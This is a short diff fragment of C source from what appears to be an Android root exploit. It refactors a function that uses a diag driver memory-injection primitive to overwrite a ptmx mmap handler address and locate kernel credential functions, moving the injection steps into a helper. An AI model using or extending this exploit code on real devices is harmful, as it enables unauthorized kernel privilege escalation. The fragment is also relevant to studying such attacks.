@@ -142,19 +142,12 @@ static bool
 find_with_diag_exploit(unsigned int ptmx_mmap_address)
 {
   struct diag_values injection_data;
-  bool success;
 
   injection_data.address = ptmx_mmap_address;
   injection_data.value = (uint16_t)&ptmx_mmap;
 
-  if (!diag_inject(&injection_data, 1)) {
-    return false;
-  }
-
-  success = find_creds_functions_with_mmap(NULL);
-
-  injection_data.value = 3;
-  return diag_inject(&injection_data, 1) && success;
+  return diag_run_exploit(&injection_data, 1,
+                          find_creds_functions_with_mmap, NULL);
 }
 
 static bool
